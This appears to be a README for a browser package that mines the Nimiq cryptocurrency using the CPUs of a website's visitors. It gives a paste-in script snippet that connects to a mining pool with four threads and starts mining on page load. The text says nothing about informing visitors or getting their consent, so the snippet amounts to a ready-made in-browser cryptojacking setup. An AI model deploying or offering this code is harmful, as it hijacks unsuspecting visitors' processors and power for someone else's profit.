# Nimiq Client for browser document

This package is use for mine cryptocurrencies NIMIQ (NIM) by NIMIQ Client SDK from CPU of visitor of your website.

## Nimiq

### Basic initialization
Download "client.js" or "client.min.js" and append in bottom of body

```
<script src="client.min.js" type="text/javascript"></script>
<script>
 const miner = new Client({
    miningPool: { host: 'pool.nimiq.watch', port: '8443' },
    address: 'nimiq addresss',
    threads: 4
  });

  miner.start();
</script>
```
